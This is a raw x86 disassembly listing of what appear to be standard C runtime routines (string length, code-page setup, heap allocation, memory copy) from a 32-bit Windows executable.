  423f37:	xor    eax,eax
  423f39:	mov    DWORD PTR [edi],eax
  423f3b:	add    edi,0x4
  423f3e:	sub    ecx,0x1
  423f41:	jne    0x423f39
  423f43:	and    ebx,0x3
  423f46:	jne    0x423ec3
  423f4c:	mov    eax,DWORD PTR [esp+0x10]
  423f50:	pop    ebx
  423f51:	pop    esi
  423f52:	pop    edi
  423f53:	ret    
  423f54:	int3   
  423f55:	int3   
  423f56:	int3   
  423f57:	int3   
  423f58:	int3   
  423f59:	int3   
  423f5a:	int3   
  423f5b:	int3   
  423f5c:	int3   
  423f5d:	int3   
  423f5e:	int3   
  423f5f:	int3   
  423f60:	mov    ecx,DWORD PTR [esp+0x4]
  423f64:	test   ecx,0x3
  423f6a:	je     0x423f90
  423f6c:	mov    al,BYTE PTR [ecx]
  423f6e:	add    ecx,0x1
  423f71:	test   al,al
  423f73:	je     0x423fc3
  423f75:	test   ecx,0x3
  423f7b:	jne    0x423f6c
  423f7d:	add    eax,0x0
  423f82:	lea    esp,[esp+0x0]
  423f89:	lea    esp,[esp+0x0]
  423f90:	mov    eax,DWORD PTR [ecx]
  423f92:	mov    edx,0x7efefeff
  423f97:	add    edx,eax
  423f99:	xor    eax,0xffffffff
  423f9c:	xor    eax,edx
  423f9e:	add    ecx,0x4
  423fa1:	test   eax,0x81010100
  423fa6:	je     0x423f90
  423fa8:	mov    eax,DWORD PTR [ecx-0x4]
  423fab:	test   al,al
  423fad:	je     0x423fe1
  423faf:	test   ah,ah
  423fb1:	je     0x423fd7
  423fb3:	test   eax,0xff0000
  423fb8:	je     0x423fcd
  423fba:	test   eax,0xff000000
  423fbf:	je     0x423fc3
  423fc1:	jmp    0x423f90
  423fc3:	lea    eax,[ecx-0x1]
  423fc6:	mov    ecx,DWORD PTR [esp+0x4]
  423fca:	sub    eax,ecx
  423fcc:	ret    
  423fcd:	lea    eax,[ecx-0x2]
  423fd0:	mov    ecx,DWORD PTR [esp+0x4]
  423fd4:	sub    eax,ecx
  423fd6:	ret    
  423fd7:	lea    eax,[ecx-0x3]
  423fda:	mov    ecx,DWORD PTR [esp+0x4]
  423fde:	sub    eax,ecx
  423fe0:	ret    
  423fe1:	lea    eax,[ecx-0x4]
  423fe4:	mov    ecx,DWORD PTR [esp+0x4]
  423fe8:	sub    eax,ecx
  423fea:	ret    
  423feb:	push   0x8
  423fed:	push   0x428598
  423ff2:	call   0x423950
  423ff7:	and    DWORD PTR [ebp-0x4],0x0
  423ffb:	push   0x0
  423ffd:	push   0x1
  423fff:	call   0x425b72
  424004:	pop    ecx
  424005:	pop    ecx
  424006:	jmp    0x42400f
  424008:	xor    eax,eax
  42400a:	inc    eax
  42400b:	ret    
  42400c:	mov    esp,DWORD PTR [ebp-0x18]
  42400f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424013:	push   0x3
  424015:	call   DWORD PTR ds:0x42806c
  42401b:	int3   
  42401c:	cmp    ecx,DWORD PTR ds:0x4646c0
  424022:	jne    0x424025
  424024:	ret    
  424025:	jmp    0x423feb
  42402a:	movzx  eax,BYTE PTR [esp+0x4]
  42402f:	mov    cl,BYTE PTR [esp+0xc]
  424033:	test   BYTE PTR [eax+0x4651c1],cl
  424039:	jne    0x424057
  42403b:	cmp    DWORD PTR [esp+0x8],0x0
  424040:	je     0x424050
  424042:	movzx  eax,WORD PTR [eax*2+0x428992]
  42404a:	and    eax,DWORD PTR [esp+0x8]
  42404e:	jmp    0x424052
  424050:	xor    eax,eax
  424052:	test   eax,eax
  424054:	jne    0x424057
  424056:	ret    
  424057:	xor    eax,eax
  424059:	inc    eax
  42405a:	ret    
  42405b:	push   0x4
  42405d:	push   0x0
  42405f:	push   DWORD PTR [esp+0xc]
  424063:	call   0x42402a
  424068:	add    esp,0xc
  42406b:	ret    
  42406c:	sub    eax,0x3a4
  424071:	je     0x424095
  424073:	sub    eax,0x4
  424076:	je     0x42408f
  424078:	sub    eax,0xd
  42407b:	je     0x424089
  42407d:	dec    eax
  42407e:	je     0x424083
  424080:	xor    eax,eax
  424082:	ret    
  424083:	mov    eax,0x404
  424088:	ret    
  424089:	mov    eax,0x412
  42408e:	ret    
  42408f:	mov    eax,0x804
  424094:	ret    
  424095:	mov    eax,0x411
  42409a:	ret    
  42409b:	push   edi
  42409c:	push   0x40
  42409e:	xor    eax,eax
  4240a0:	pop    ecx
  4240a1:	mov    edi,0x4651c0
  4240a6:	rep stos DWORD PTR es:[edi],eax
  4240a8:	stos   BYTE PTR es:[edi],al
  4240a9:	xor    eax,eax
  4240ab:	mov    ds:0x4652c4,eax
  4240b0:	mov    ds:0x4651bc,eax
  4240b5:	mov    ds:0x4651b4,eax
  4240ba:	mov    edi,0x4652d0
  4240bf:	stos   DWORD PTR es:[edi],eax
  4240c0:	stos   DWORD PTR es:[edi],eax
  4240c1:	stos   DWORD PTR es:[edi],eax
  4240c2:	pop    edi
  4240c3:	ret    
  4240c4:	push   ebp
  4240c5:	mov    ebp,esp
  4240c7:	sub    esp,0x518
  4240cd:	mov    eax,ds:0x4646c0
  4240d2:	xor    eax,DWORD PTR [ebp+0x4]
  4240d5:	push   esi
  4240d6:	mov    DWORD PTR [ebp-0x4],eax
  4240d9:	lea    eax,[ebp-0x18]
  4240dc:	push   eax
  4240dd:	push   DWORD PTR ds:0x4652c4
  4240e3:	call   DWORD PTR ds:0x4280e0
  4240e9:	cmp    eax,0x1
  4240ec:	mov    esi,0x100
  4240f1:	jne    0x424204
  4240f7:	xor    eax,eax
  4240f9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424100:	inc    eax
  424101:	cmp    eax,esi
  424103:	jb     0x4240f9
  424105:	mov    al,BYTE PTR [ebp-0x12]
  424108:	test   al,al
  42410a:	mov    BYTE PTR [ebp-0x118],0x20
  424111:	je     0x424149
  424113:	push   ebx
  424114:	lea    edx,[ebp-0x11]
  424117:	push   edi
  424118:	movzx  ecx,BYTE PTR [edx]
  42411b:	movzx  eax,al
  42411e:	cmp    eax,ecx
  424120:	ja     0x42413f
  424122:	sub    ecx,eax
  424124:	inc    ecx
  424125:	mov    ebx,ecx
  424127:	shr    ecx,0x2
  42412a:	lea    edi,[ebp+eax*1-0x118]
  424131:	mov    eax,0x20202020
  424136:	rep stos DWORD PTR es:[edi],eax
  424138:	mov    ecx,ebx
  42413a:	and    ecx,0x3
  42413d:	rep stos BYTE PTR es:[edi],al
  42413f:	inc    edx
  424140:	mov    al,BYTE PTR [edx]
  424142:	inc    edx
  424143:	test   al,al
  424145:	jne    0x424118
  424147:	pop    edi
  424148:	pop    ebx
  424149:	push   0x0
  42414b:	push   DWORD PTR ds:0x4651b4
  424151:	lea    eax,[ebp-0x518]
  424157:	push   DWORD PTR ds:0x4652c4
  42415d:	push   eax
  42415e:	push   esi
  42415f:	lea    eax,[ebp-0x118]
  424165:	push   eax
  424166:	push   0x1
  424168:	call   0x426078
  42416d:	push   0x0
  42416f:	push   DWORD PTR ds:0x4652c4
  424175:	lea    eax,[ebp-0x218]
  42417b:	push   esi
  42417c:	push   eax
  42417d:	push   esi
  42417e:	lea    eax,[ebp-0x118]
  424184:	push   eax
  424185:	push   esi
  424186:	push   DWORD PTR ds:0x4651b4
  42418c:	call   0x425cbc
  424191:	push   0x0
  424193:	push   DWORD PTR ds:0x4652c4
  424199:	lea    eax,[ebp-0x318]
  42419f:	push   esi
  4241a0:	push   eax
  4241a1:	push   esi
  4241a2:	lea    eax,[ebp-0x118]
  4241a8:	push   eax
  4241a9:	push   0x200
  4241ae:	push   DWORD PTR ds:0x4651b4
  4241b4:	call   0x425cbc
  4241b9:	add    esp,0x5c
  4241bc:	xor    eax,eax
  4241be:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241c6:	test   cl,0x1
  4241c9:	je     0x4241e1
  4241cb:	or     BYTE PTR [eax+0x4651c1],0x10
  4241d2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241d9:	mov    BYTE PTR [eax+0x4652e0],cl
  4241df:	jmp    0x4241fd
  4241e1:	test   cl,0x2
  4241e4:	je     0x4241f6
  4241e6:	or     BYTE PTR [eax+0x4651c1],0x20
  4241ed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241f4:	jmp    0x4241d9
  4241f6:	and    BYTE PTR [eax+0x4652e0],0x0
  4241fd:	inc    eax
  4241fe:	cmp    eax,esi
  424200:	jb     0x4241be
  424202:	jmp    0x424248
  424204:	xor    eax,eax
  424206:	cmp    eax,0x41
  424209:	jb     0x424224
  42420b:	cmp    eax,0x5a
  42420e:	ja     0x424224
  424210:	or     BYTE PTR [eax+0x4651c1],0x10
  424217:	mov    cl,al
  424219:	add    cl,0x20
  42421c:	mov    BYTE PTR [eax+0x4652e0],cl
  424222:	jmp    0x424243
  424224:	cmp    eax,0x61
  424227:	jb     0x42423c
  424229:	cmp    eax,0x7a
  42422c:	ja     0x42423c
  42422e:	or     BYTE PTR [eax+0x4651c1],0x20
  424235:	mov    cl,al
  424237:	sub    cl,0x20
  42423a:	jmp    0x42421c
  42423c:	and    BYTE PTR [eax+0x4652e0],0x0
  424243:	inc    eax
  424244:	cmp    eax,esi
  424246:	jb     0x424206
  424248:	mov    ecx,DWORD PTR [ebp-0x4]
  42424b:	xor    ecx,DWORD PTR [ebp+0x4]
  42424e:	pop    esi
  42424f:	call   0x42401c
  424254:	leave  
  424255:	ret    
  424256:	push   ebp
  424257:	mov    ebp,esp
  424259:	sub    esp,0x1c
  42425c:	mov    eax,ds:0x4646c0
  424261:	xor    eax,DWORD PTR [ebp+0x4]
  424264:	push   ebx
  424265:	push   esi
  424266:	mov    esi,DWORD PTR [ebp+0x8]
  424269:	xor    ebx,ebx
  42426b:	cmp    esi,ebx
  42426d:	mov    DWORD PTR [ebp-0x4],eax
  424270:	push   edi
  424271:	je     0x4243cb
  424277:	xor    edx,edx
  424279:	xor    eax,eax
  42427b:	cmp    DWORD PTR [eax+0x4646d0],esi
  424281:	je     0x4242e8
  424283:	add    eax,0x30
  424286:	inc    edx
  424287:	cmp    eax,0xf0
  42428c:	jb     0x42427b
  42428e:	lea    eax,[ebp-0x1c]
  424291:	push   eax
  424292:	push   esi
  424293:	call   DWORD PTR ds:0x4280e0
  424299:	cmp    eax,0x1
  42429c:	jne    0x4243c3
  4242a2:	push   0x40
  4242a4:	xor    eax,eax
  4242a6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4242aa:	pop    ecx
  4242ab:	mov    edi,0x4651c0
  4242b0:	rep stos DWORD PTR es:[edi],eax
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	mov    DWORD PTR ds:0x4652c4,esi
  4242b9:	mov    DWORD PTR ds:0x4651b4,ebx
  4242bf:	jbe    0x4243b1
  4242c5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242c9:	je     0x424389
  4242cf:	lea    ecx,[ebp-0x15]
  4242d2:	mov    dl,BYTE PTR [ecx]
  4242d4:	test   dl,dl
  4242d6:	je     0x424389
  4242dc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242e0:	movzx  edx,dl
  4242e3:	jmp    0x424379
  4242e8:	push   0x40
  4242ea:	xor    eax,eax
  4242ec:	pop    ecx
  4242ed:	mov    edi,0x4651c0
  4242f2:	rep stos DWORD PTR es:[edi],eax
  4242f4:	lea    ecx,[edx+edx*2]
  4242f7:	shl    ecx,0x4
  4242fa:	mov    DWORD PTR [ebp-0x8],ebx
  4242fd:	stos   BYTE PTR es:[edi],al
  4242fe:	lea    ebx,[ecx+0x4646e0]
  424304:	mov    al,BYTE PTR [ebx]
  424306:	mov    esi,ebx
  424308:	jmp    0x424333
  42430a:	mov    dl,BYTE PTR [esi+0x1]
  42430d:	test   dl,dl
  42430f:	je     0x424337
  424311:	movzx  eax,al
  424314:	movzx  edi,dl
  424317:	cmp    eax,edi
  424319:	ja     0x42432f
  42431b:	mov    edx,DWORD PTR [ebp-0x8]
  42431e:	mov    dl,BYTE PTR [edx+0x4646c8]
  424324:	or     BYTE PTR [eax+0x4651c1],dl
  42432a:	inc    eax
  42432b:	cmp    eax,edi
  42432d:	jbe    0x424324
  42432f:	inc    esi
  424330:	inc    esi
  424331:	mov    al,BYTE PTR [esi]
  424333:	test   al,al
  424335:	jne    0x42430a
  424337:	inc    DWORD PTR [ebp-0x8]
  42433a:	add    ebx,0x8
  42433d:	cmp    DWORD PTR [ebp-0x8],0x4
  424341:	jb     0x424304
  424343:	mov    eax,DWORD PTR [ebp+0x8]
  424346:	mov    ds:0x4652c4,eax
  42434b:	mov    DWORD PTR ds:0x4651bc,0x1
  424355:	call   0x42406c
  42435a:	lea    ecx,[ecx+0x4646d4]
  424360:	mov    esi,ecx
  424362:	mov    edi,0x4652d0
  424367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424369:	mov    ds:0x4651b4,eax
  42436e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436f:	jmp    0x4243d0
  424371:	or     BYTE PTR [eax+0x4651c1],0x4
  424378:	inc    eax
  424379:	cmp    eax,edx
  42437b:	jbe    0x424371
  42437d:	inc    ecx
  42437e:	inc    ecx
  42437f:	cmp    BYTE PTR [ecx-0x1],0x0
  424383:	jne    0x4242d2
  424389:	xor    ecx,ecx
  42438b:	inc    ecx
  42438c:	mov    eax,ecx
  42438e:	or     BYTE PTR [eax+0x4651c1],0x8
  424395:	inc    eax
  424396:	cmp    eax,0xff
  42439b:	jb     0x42438e
  42439d:	mov    eax,esi
  42439f:	call   0x42406c
  4243a4:	mov    ds:0x4651b4,eax
  4243a9:	mov    DWORD PTR ds:0x4651bc,ecx
  4243af:	jmp    0x4243b7
  4243b1:	mov    DWORD PTR ds:0x4651bc,ebx
  4243b7:	xor    eax,eax
  4243b9:	mov    edi,0x4652d0
  4243be:	stos   DWORD PTR es:[edi],eax
  4243bf:	stos   DWORD PTR es:[edi],eax
  4243c0:	stos   DWORD PTR es:[edi],eax
  4243c1:	jmp    0x4243d0
  4243c3:	cmp    DWORD PTR ds:0x465024,ebx
  4243c9:	je     0x4243d9
  4243cb:	call   0x42409b
  4243d0:	call   0x4240c4
  4243d5:	xor    eax,eax
  4243d7:	jmp    0x4243dc
  4243d9:	or     eax,0xffffffff
  4243dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243df:	xor    ecx,DWORD PTR [ebp+0x4]
  4243e2:	pop    edi
  4243e3:	pop    esi
  4243e4:	pop    ebx
  4243e5:	call   0x42401c
  4243ea:	leave  
  4243eb:	ret    
  4243ec:	push   0x14
  4243ee:	push   0x4285a8
  4243f3:	call   0x423950
  4243f8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243fc:	push   0xd
  4243fe:	call   0x423b0f
  424403:	pop    ecx
  424404:	xor    edi,edi
  424406:	mov    DWORD PTR [ebp-0x4],edi
  424409:	mov    DWORD PTR ds:0x465024,edi
  42440f:	mov    eax,DWORD PTR [ebp+0x8]
  424412:	cmp    eax,0xfffffffe
  424415:	jne    0x424429
  424417:	mov    DWORD PTR ds:0x465024,0x1
  424421:	call   DWORD PTR ds:0x4280dc
  424427:	jmp    0x424454
  424429:	cmp    eax,0xfffffffd
  42442c:	jne    0x424440
  42442e:	mov    DWORD PTR ds:0x465024,0x1
  424438:	call   DWORD PTR ds:0x4280d8
  42443e:	jmp    0x424454
  424440:	cmp    eax,0xfffffffc
  424443:	jne    0x424454
  424445:	mov    DWORD PTR ds:0x465024,0x1
  42444f:	mov    eax,ds:0x465054
  424454:	mov    DWORD PTR [ebp+0x8],eax
  424457:	cmp    eax,DWORD PTR ds:0x4652c4
  42445d:	je     0x42451e
  424463:	mov    esi,DWORD PTR ds:0x4651b8
  424469:	mov    DWORD PTR [ebp-0x20],esi
  42446c:	cmp    esi,edi
  42446e:	je     0x424474
  424470:	cmp    DWORD PTR [esi],edi
  424472:	je     0x424484
  424474:	push   0x220
  424479:	call   0x424672
  42447e:	pop    ecx
  42447f:	mov    esi,eax
  424481:	mov    DWORD PTR [ebp-0x20],esi
  424484:	cmp    esi,edi
  424486:	je     0x424507
  424488:	push   DWORD PTR [ebp+0x8]
  42448b:	call   0x424256
  424490:	pop    ecx
  424491:	mov    DWORD PTR [ebp-0x1c],eax
  424494:	cmp    eax,edi
  424496:	jne    0x424507
  424498:	mov    DWORD PTR [esi],edi
  42449a:	mov    eax,ds:0x4652c4
  42449f:	mov    DWORD PTR [esi+0x4],eax
  4244a2:	mov    eax,ds:0x4651bc
  4244a7:	mov    DWORD PTR [esi+0x8],eax
  4244aa:	mov    eax,ds:0x4651b4
  4244af:	mov    DWORD PTR [esi+0xc],eax
  4244b2:	xor    eax,eax
  4244b4:	mov    DWORD PTR [ebp-0x24],eax
  4244b7:	cmp    eax,0x5
  4244ba:	jge    0x4244cc
  4244bc:	mov    cx,WORD PTR [eax*2+0x4652d0]
  4244c4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244c9:	inc    eax
  4244ca:	jmp    0x4244b4
  4244cc:	xor    eax,eax
  4244ce:	mov    DWORD PTR [ebp-0x24],eax
  4244d1:	cmp    eax,0x101
  4244d6:	jge    0x4244e5
  4244d8:	mov    cl,BYTE PTR [eax+0x4651c0]
  4244de:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244e2:	inc    eax
  4244e3:	jmp    0x4244ce
  4244e5:	xor    eax,eax
  4244e7:	mov    DWORD PTR [ebp-0x24],eax
  4244ea:	cmp    eax,0x100
  4244ef:	jge    0x424501
  4244f1:	mov    cl,BYTE PTR [eax+0x4652e0]
  4244f7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244fe:	inc    eax
  4244ff:	jmp    0x4244e7
  424501:	mov    DWORD PTR ds:0x4651b8,esi
  424507:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42450b:	jne    0x424521
  42450d:	cmp    esi,DWORD PTR ds:0x4651b8
  424513:	je     0x424521
  424515:	push   esi
  424516:	call   0x42455a
  42451b:	pop    ecx
  42451c:	jmp    0x424521
  42451e:	mov    DWORD PTR [ebp-0x1c],edi
  424521:	or     DWORD PTR [ebp-0x4],0xffffffff
  424525:	call   0x424533
  42452a:	mov    eax,DWORD PTR [ebp-0x1c]
  42452d:	call   0x42398b
  424532:	ret    
  424533:	push   0xd
  424535:	call   0x423a7b
  42453a:	pop    ecx
  42453b:	ret    
  42453c:	cmp    DWORD PTR ds:0x46550c,0x0
  424543:	jne    0x424557
  424545:	push   0xfffffffd
  424547:	call   0x4243ec
  42454c:	pop    ecx
  42454d:	mov    DWORD PTR ds:0x46550c,0x1
  424557:	xor    eax,eax
  424559:	ret    
  42455a:	push   0xc
  42455c:	push   0x4285b8
  424561:	call   0x423950
  424566:	mov    esi,DWORD PTR [ebp+0x8]
  424569:	test   esi,esi
  42456b:	je     0x4245c5
  42456d:	cmp    DWORD PTR ds:0x4653e4,0x3
  424574:	jne    0x4245b6
  424576:	push   0x4
  424578:	call   0x423b0f
  42457d:	pop    ecx
  42457e:	and    DWORD PTR [ebp-0x4],0x0
  424582:	push   esi
  424583:	call   0x424d32
  424588:	pop    ecx
  424589:	mov    DWORD PTR [ebp-0x1c],eax
  42458c:	test   eax,eax
  42458e:	je     0x424599
  424590:	push   esi
  424591:	push   eax
  424592:	call   0x424d5d
  424597:	pop    ecx
  424598:	pop    ecx
  424599:	or     DWORD PTR [ebp-0x4],0xffffffff
  42459d:	call   0x4245ad
  4245a2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4245a6:	jne    0x4245c5
  4245a8:	push   DWORD PTR [ebp+0x8]
  4245ab:	jmp    0x4245b7
  4245ad:	push   0x4
  4245af:	call   0x423a7b
  4245b4:	pop    ecx
  4245b5:	ret    
  4245b6:	push   esi
  4245b7:	push   0x0
  4245b9:	push   DWORD PTR ds:0x4653e0
  4245bf:	call   DWORD PTR ds:0x4280c8
  4245c5:	call   0x42398b
  4245ca:	ret    
  4245cb:	push   0xc
  4245cd:	push   0x4285c8
  4245d2:	call   0x423950
  4245d7:	mov    esi,DWORD PTR [ebp+0x8]
  4245da:	cmp    DWORD PTR ds:0x4653e4,0x3
  4245e1:	jne    0x424611
  4245e3:	cmp    esi,DWORD PTR ds:0x4651a4
  4245e9:	ja     0x424611
  4245eb:	push   0x4
  4245ed:	call   0x423b0f
  4245f2:	pop    ecx
  4245f3:	and    DWORD PTR [ebp-0x4],0x0
  4245f7:	push   esi
  4245f8:	call   0x425511
  4245fd:	pop    ecx
  4245fe:	mov    DWORD PTR [ebp-0x1c],eax
  424601:	or     DWORD PTR [ebp-0x4],0xffffffff
  424605:	call   0x42463d
  42460a:	mov    eax,DWORD PTR [ebp-0x1c]
  42460d:	test   eax,eax
  42460f:	jne    0x424634
  424611:	test   esi,esi
  424613:	jne    0x424616
  424615:	inc    esi
  424616:	cmp    DWORD PTR ds:0x4653e4,0x1
  42461d:	je     0x424625
  42461f:	add    esi,0xf
  424622:	and    esi,0xfffffff0
  424625:	push   esi
  424626:	push   0x0
  424628:	push   DWORD PTR ds:0x4653e0
  42462e:	call   DWORD PTR ds:0x4280e4
  424634:	call   0x42398b
  424639:	ret    
  42463a:	mov    esi,DWORD PTR [ebp+0x8]
  42463d:	push   0x4
  42463f:	call   0x423a7b
  424644:	pop    ecx
  424645:	ret    
  424646:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42464b:	ja     0x42466f
  42464d:	push   DWORD PTR [esp+0x4]
  424651:	call   0x4245cb
  424656:	test   eax,eax
  424658:	pop    ecx
  424659:	jne    0x424671
  42465b:	cmp    DWORD PTR [esp+0x8],eax
  42465f:	je     0x424671
  424661:	push   DWORD PTR [esp+0x4]
  424665:	call   0x426232
  42466a:	test   eax,eax
  42466c:	pop    ecx
  42466d:	jne    0x42464d
  42466f:	xor    eax,eax
  424671:	ret    
  424672:	push   DWORD PTR ds:0x465068
  424678:	push   DWORD PTR [esp+0x8]
  42467c:	call   0x424646
  424681:	pop    ecx
  424682:	pop    ecx
  424683:	ret    
  424684:	int3   
  424685:	int3   
  424686:	int3   
  424687:	int3   
  424688:	int3   
  424689:	int3   
  42468a:	int3   
  42468b:	int3   
  42468c:	int3   
  42468d:	int3   
  42468e:	int3   
  42468f:	int3   
  424690:	push   ebp
  424691:	mov    ebp,esp
  424693:	push   edi
  424694:	push   esi
  424695:	mov    esi,DWORD PTR [ebp+0xc]
  424698:	mov    ecx,DWORD PTR [ebp+0x10]
  42469b:	mov    edi,DWORD PTR [ebp+0x8]
  42469e:	mov    eax,ecx
  4246a0:	mov    edx,ecx
  4246a2:	add    eax,esi
  4246a4:	cmp    edi,esi
  4246a6:	jbe    0x4246b0
  4246a8:	cmp    edi,eax
  4246aa:	jb     0x42482c
  4246b0:	test   edi,0x3
  4246b6:	jne    0x4246cc
  4246b8:	shr    ecx,0x2
  4246bb:	and    edx,0x3
  4246be:	cmp    ecx,0x8
  4246c1:	jb     0x4246ec
  4246c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c5:	jmp    DWORD PTR [edx*4+0x4247dc]
  4246cc:	mov    eax,edi
  4246ce:	mov    edx,0x3
  4246d3:	sub    ecx,0x4
  4246d6:	jb     0x4246e4
  4246d8:	and    eax,0x3
  4246db:	add    ecx,eax
  4246dd:	jmp    DWORD PTR [eax*4+0x4246f0]
  4246e4:	jmp    DWORD PTR [ecx*4+0x4247ec]
  4246eb:	nop
  4246ec:	jmp    DWORD PTR [ecx*4+0x424770]
  4246f3:	nop
  4246f4:	add    BYTE PTR [edi+0x42],al
  4246f7:	add    BYTE PTR [edi+eax*2],ch
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [eax+0x47],dl
  4246fe:	inc    edx
  4246ff:	add    BYTE PTR [ebx],ah
  424701:	ror    DWORD PTR [edx-0x75f877fa],1
  424707:	inc    esi
  424708:	add    DWORD PTR [eax+0x468a0147],ecx
  42470e:	add    al,cl
  424710:	jmp    0x289cf17
  424715:	add    esi,0x3
  424718:	add    edi,0x3
  42471b:	cmp    ecx,0x8
  42471e:	jb     0x4246ec
  424720:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424722:	jmp    DWORD PTR [edx*4+0x4247dc]
  424729:	lea    ecx,[ecx+0x0]
  42472c:	and    edx,ecx
  42472e:	mov    al,BYTE PTR [esi]
  424730:	mov    BYTE PTR [edi],al
  424732:	mov    al,BYTE PTR [esi+0x1]
  424735:	shr    ecx,0x2
  424738:	mov    BYTE PTR [edi+0x1],al
  42473b:	add    esi,0x2
  42473e:	add    edi,0x2
  424741:	cmp    ecx,0x8
  424744:	jb     0x4246ec
  424746:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	jmp    DWORD PTR [edx*4+0x4247dc]
  42474f:	nop
  424750:	and    edx,ecx
  424752:	mov    al,BYTE PTR [esi]
  424754:	mov    BYTE PTR [edi],al
  424756:	add    esi,0x1
  424759:	shr    ecx,0x2
  42475c:	add    edi,0x1
  42475f:	cmp    ecx,0x8
  424762:	jb     0x4246ec
  424764:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424766:	jmp    DWORD PTR [edx*4+0x4247dc]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	rol    DWORD PTR [edi+0x42],cl
  424773:	add    al,al
  424775:	inc    edi
  424776:	inc    edx
  424777:	add    BYTE PTR [eax-0x4fffbdb9],bh
  42477d:	inc    edi
  42477e:	inc    edx
  42477f:	add    BYTE PTR [eax-0x5fffbdb9],ch
  424785:	inc    edi
  424786:	inc    edx
  424787:	add    BYTE PTR [eax-0x6fffbdb9],bl
  42478d:	inc    edi
  42478e:	inc    edx
  42478f:	add    BYTE PTR [ebx-0x761b71bc],cl
  424795:	inc    esp
  424796:	(bad)  
  424797:	in     al,0x8b
  424799:	inc    esp
  42479a:	mov    gs,eax
  42479c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247c8:	lea    eax,[ecx*4+0x0]
  4247cf:	add    esi,eax
  4247d1:	add    edi,eax
  4247d3:	jmp    DWORD PTR [edx*4+0x4247dc]
  4247da:	mov    edi,edi
  4247dc:	in     al,dx
  4247dd:	inc    edi
  4247de:	inc    edx
  4247df:	add    ah,dh
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],al
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax+ecx*2],dl
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247f1:	leave  
  4247f2:	ret    
  4247f3:	nop
  4247f4:	mov    al,BYTE PTR [esi]
  4247f6:	mov    BYTE PTR [edi],al
  4247f8:	mov    eax,DWORD PTR [ebp+0x8]
  4247fb:	pop    esi
  4247fc:	pop    edi
  4247fd:	leave  
  4247fe:	ret    
  4247ff:	nop
  424800:	mov    al,BYTE PTR [esi]
  424802:	mov    BYTE PTR [edi],al
  424804:	mov    al,BYTE PTR [esi+0x1]
  424807:	mov    BYTE PTR [edi+0x1],al
  42480a:	mov    eax,DWORD PTR [ebp+0x8]
  42480d:	pop    esi
  42480e:	pop    edi
  42480f:	leave  
  424810:	ret    
  424811:	lea    ecx,[ecx+0x0]
  424814:	mov    al,BYTE PTR [esi]
  424816:	mov    BYTE PTR [edi],al
  424818:	mov    al,BYTE PTR [esi+0x1]
  42481b:	mov    BYTE PTR [edi+0x1],al
  42481e:	mov    al,BYTE PTR [esi+0x2]
  424821:	mov    BYTE PTR [edi+0x2],al
  424824:	mov    eax,DWORD PTR [ebp+0x8]
  424827:	pop    esi
  424828:	pop    edi
  424829:	leave  
  42482a:	ret    
  42482b:	nop
  42482c:	lea    esi,[ecx+esi*1-0x4]
  424830:	lea    edi,[ecx+edi*1-0x4]
  424834:	test   edi,0x3
  42483a:	jne    0x424860
  42483c:	shr    ecx,0x2
  42483f:	and    edx,0x3
  424842:	cmp    ecx,0x8
  424845:	jb     0x424854
  424847:	std    
  424848:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484a:	cld    
  42484b:	jmp    DWORD PTR [edx*4+0x424978]
  424852:	mov    edi,edi
  424854:	neg    ecx
  424856:	jmp    DWORD PTR [ecx*4+0x424928]
  42485d:	lea    ecx,[ecx+0x0]
  424860:	mov    eax,edi
  424862:	mov    edx,0x3
  424867:	cmp    ecx,0x4
  42486a:	jb     0x424878
  42486c:	and    eax,0x3
  42486f:	sub    ecx,eax
  424871:	jmp    DWORD PTR [eax*4+0x42487c]
  424878:	jmp    DWORD PTR [ecx*4+0x424978]
  42487f:	nop
  424880:	mov    WORD PTR [eax+0x42],cs
  424883:	add    BYTE PTR [eax-0x27ffbdb8],dh
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424891:	mov    BYTE PTR [edi+0x3],al
  424894:	sub    esi,0x1
  424897:	shr    ecx,0x2
  42489a:	sub    edi,0x1
  42489d:	cmp    ecx,0x8
  4248a0:	jb     0x424854
  4248a2:	std    
